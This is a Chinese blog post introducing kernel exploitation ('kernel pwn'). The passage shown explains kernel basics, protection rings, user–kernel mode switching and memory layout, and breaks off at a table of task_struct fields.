<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="collectcrop">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn初探/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="kernel pwn初探 基础知识 基础的概念入门时不宜死磕，最好粗略看看留个印象，然后下去环境配好后，在调试探索时逐步深化理解。 如何理解内核 操作系统内核（Operation System Kernel）本质上也是一种软件，可以看作是普通应用程式与硬件之间的一层中间层，其主要作用便是调度系统资源、控制 IO 设备、操作网络与文件系统等，并为上层应用提供便捷、抽象的应用接口。操作系">
<meta property="og:type" content="article">
<meta property="og:title" content="kernel pwn初探">
<meta property="og:url" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/index.html">
<meta property="og:site_name" content="Collectcrop&#39;s Blog">
<meta property="og:description" content="kernel pwn初探 基础知识 基础的概念入门时不宜死磕，最好粗略看看留个印象，然后下去环境配好后，在调试探索时逐步深化理解。 如何理解内核 操作系统内核（Operation System Kernel）本质上也是一种软件，可以看作是普通应用程式与硬件之间的一层中间层，其主要作用便是调度系统资源、控制 IO 设备、操作网络与文件系统等，并为上层应用提供便捷、抽象的应用接口。操作系">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/ring_model.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/mm_layout_32.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/mm_layout_64.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/task_struct.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250112233721560.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113003141550.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113004218124.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113004304194.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113223946647.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113230522662.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113230655614.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114004241555.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114145451508.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-01-14-000023.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114151349527.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114151546880.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114153803147.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250111221325011.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250111224302985.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250111224440566.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114201804986.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114202256392.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250114203048016.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117004743103.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117005845709.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117010622321.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117010705905.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117144829081.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117144951857.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145051360.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145312844.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145441269.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117145616435.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117153339477.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117165103393.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117170701255.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117171647372.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117232044372.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118001545125.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118003618379.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118003632606.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118004009402.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118004050999.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118005531726.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250119171402051.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250119180323832.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250120000054782.png">
<meta property="og:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250119172615036.png">
<meta property="article:published_time" content="2025-02-22T07:53:03.000Z">
<meta property="article:modified_time" content="2025-02-22T07:53:04.236Z">
<meta property="article:author" content="collectcrop">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="kernel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://collectcrop.github.io/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/ring_model.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/blog/images/redefine-favicon.svg" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/redefine-favicon.svg">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/blog/images/redefine-favicon.svg">
    <!--- Page Info-->
    
    <title>
        
            kernel pwn初探 | Collectcrop&#39;s Blog
        
    </title>

    
<link rel="stylesheet" href="/blog/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/blog/css/style.css">


    
        
<link rel="stylesheet" href="/blog/build/css/tailwind.css">

    

    
<link rel="stylesheet" href="/blog/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/blog/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
    
    
    
    
        
<script src="/blog/build/js/libs/anime.min.js"></script>

    

    <script id="hexo-configurations">
    window.config = {"hostname":"collectcrop.github.io","root":"/blog/","language":"zh-CN","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":true,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Collectcrop's Blog","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/collectcrop","instagram":null,"zhihu":null,"twitter":null,"email":null,"qq":"http://wpa.qq.com/msgrd?v=3&uin=2583727188&site=qq&menu=yes"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"Categories":{"path":"/categories/","icon":"fa-solid fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/links"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"Just enjoy.","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"YYYY-MM-DD","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/23 15:52:11"};
    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/blog/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/blog/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/blog/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/blog/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<style>
    :root {
        --preloader-background-color: #fff;
        --preloader-text-color: #000;
    }

    @media (prefers-color-scheme: dark) {
        :root {
            --preloader-background-color: #202124;
            --preloader-text-color: #fff;
        }
    }

    @media (prefers-color-scheme: light) {
        :root {
            --preloader-background-color: #fff;
            --preloader-text-color: #000;
        }
    }

    @media (max-width: 600px) {
        .ml13 {
            font-size: 2.6rem !important; /* Adjust this value as needed */
        }
    }

    .preloader {
        display: flex;
        flex-direction: column;
        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
        align-items: center;
        justify-content: center;
        position: fixed;
        padding: 12px;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        width: 100vw;
        height: 100vh; /* 'h-screen' is 100% of the viewport height */
        background-color: var(--preloader-background-color);
        z-index: 1100; /* 'z-[1100]' sets the z-index */
        transition: opacity 0.2s ease-in-out;
    }

    .ml13 {
        font-size: 3.2rem;
        /* text-transform: uppercase; */
        color: var(--preloader-text-color);
        letter-spacing: -1px;
        font-weight: 500;
        font-family: 'Chillax-Variable', sans-serif;
        text-align: center;
    }

    .ml13 .word {
        display: inline-flex;
        flex-wrap: wrap;
        white-space: nowrap;
    }

    .ml13 .letter {
        display: inline-block;
        line-height: 1em;
    }
</style>

<div class="preloader">
    <h2 class="ml13">
        Collectcrop&#39;s Blog
    </h2>
    <script>
        var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });

        var animation = anime.timeline({ loop: true })
            .add({
                targets: '.ml13 .letter',
                translateY: [20, 0],
                translateZ: 0,
                opacity: [0, 1],
                filter: ['blur(5px)', 'blur(0px)'],
                easing: "easeOutExpo",
                duration: 1200,
                delay: (el, i) => 300 + 20 * i,
            })
            .add({
                targets: '.ml13 .letter',
                translateY: [0, -20],
                opacity: [1, 0],
                filter: ['blur(0px)', 'blur(5px)'],
                easing: "easeInExpo",
                duration: 1000,
                delay: (el, i) => 15 * i,
                complete: function() {
                    hidePreloader();
                }
            }, '-=700');


        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
        });

        function hidePreloader() {
            var preloader = document.querySelector('.preloader');
            preloader.style.opacity = '0';
            setTimeout(function () {
                preloader.style.display = 'none';
            }, 200);
        }
    </script>
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/blog/">
                
                Collectcrop&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/blog/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    首页
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/blog/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    归档
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/blog/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/blog/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    关于
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a href="/blog/about">
                                                    ME
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a href="/blog/links">
                                                    友情链接
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/blog/"
                        >
                            <span>
                                首页
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/blog/archives"
                        >
                            <span>
                                归档
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/blog/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/blog/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-About"
                        >
                            <span>
                                关于
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/blog/about">ME</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/blog/links">友情链接</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    
                    
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/blog/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">29</div>
        <div class="label text-third-text-color text-sm">标签</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/blog/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
        <div class="label text-third-text-color text-sm">分类</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/blog/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">22</div>
        <div class="label text-third-text-color text-sm">文章</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">kernel pwn初探</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/blog/images/avatar.svg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">collectcrop</span>
					
					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-02-22 15:53:03</span>
        <span class="mobile">2025-02-22 15:53:03</span>
        <span class="hover-info">创建</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-02-22 15:53:04</span>
            <span class="mobile">2025-02-22 15:53:04</span>
            <span class="hover-info">更新</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/blog/categories/pwn/">pwn</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/blog/tags/pwn/">pwn</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/blog/tags/kernel/">kernel</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>9.8k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>41 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h2 id="kernel-pwn初探">kernel pwn初探</h2>
<h4 id="基础知识">基础知识</h4>
<p>基础的概念入门时不宜死磕，最好粗略看看留个印象，然后下去环境配好后，在调试探索时逐步深化理解。</p>
<h5 id="如何理解内核">如何理解内核</h5>
<p>操作系统内核（Operation System
Kernel）本质上也是一种软件，可以看作是普通应用程式与硬件之间的一层中间层，其主要作用便是调度系统资源、控制
IO
设备、操作网络与文件系统等，并为上层应用提供便捷、抽象的应用接口。操作系统内核实际上是我们抽象出来的一个概念，本质上与用户进程一般无二，都是位于物理内存中的代码
+ 数据，不同之处在于当 CPU
执行操作系统内核代码时通常运行在高权限，拥有着完全的硬件访问能力，而 CPU
在执行用户态代码时通常运行在低权限环境，只拥有部分 /
缺失硬件访问能力。</p>
<h5 id="分级保护域"><strong>分级保护域</strong></h5>
<p>分级保护域（hierarchical protection domains）又被称作保护环，简称
Rings ，是一种将计算机不同的资源划分至不同权限的模型。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/ring_model.png"
                      class=""
                >
<p>cpu权限等级主要分为0-3四级，基本上常用的只有Ring0和Ring3，对应操作系统内核与用户进程，即
CPU 在执行用户进程代码时处在 ring3 下。</p>
<h5 id="状态切换">状态切换</h5>
<ul>
<li>中断与异常</li>
<li>特权级相关指令（iret，sysenter...）</li>
</ul>
<p>现代操作系统的开发者包装出了系统调用（syscall），作为由”用户态
“切换到”
内核态“的入口，从而执行内核代码来完成用户进程所需的一些功能。当用户进程想要请求更高权限的服务时，便需要通过由系统提供的应用接口，使用系统调用以陷入内核态，再由操作系统完成请求。</p>
<p>当发生
<code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code>
等事件时，会发生用户态到内核态的切换，具体的过程为：</p>
<ol type="1">
<li>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS
寄存器值和一个特定位置的值进行交换，目的是保存 GS
值，同时将该位置的值作为内核执行时的 GS 值使用。</li>
<li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU
独占区域里记录的内核栈顶放入 rsp/esp。</li>
<li>通过 push 保存各寄存器值</li>
<li>通过汇编指令判断是否为 <code>x32_abi</code>。</li>
<li>通过系统调用号，跳到全局变量 <code>sys_call_table</code>
相应位置继续执行系统调用。</li>
</ol>
<p>退出时，流程如下：</p>
<ol type="1">
<li>通过 <code>swapgs</code> 恢复 GS 值。</li>
<li>通过 <code>sysretq</code> 或者 <code>iretq</code>
恢复到用户控件继续执行。如果使用 <code>iretq</code>
还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）。</li>
</ol>
<h5 id="虚拟内存分布">虚拟内存分布</h5>
<p>分为供用户使用的用户空间和供内核使用的内核空间。</p>
<p>32位内存分布：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/mm_layout_32.png"
                      class=""
                >
<p>64位内存分布：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/mm_layout_64.png"
                      class=""
                >
<h5 id="进程权限管理">进程权限管理</h5>
<p><strong>进程描述符</strong>：源码在<code>include/linux/sched.h</code>中，linux-5.15.153该版本部分源码如下，由于task_struct结构体定义极长，这里继续引用ctfwiki上的图片。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/task_struct.png"
                      class=""
                >
<p><strong>重要字段结构化表格</strong></p>
<table>
<colgroup>
<col style="width: 26%" />
<col style="width: 37%" />
<col style="width: 35%" />
</colgroup>
<thead>
<tr>
<th>类别</th>
<th>字段</th>
<th>说明</th>
</tr>
</thead>
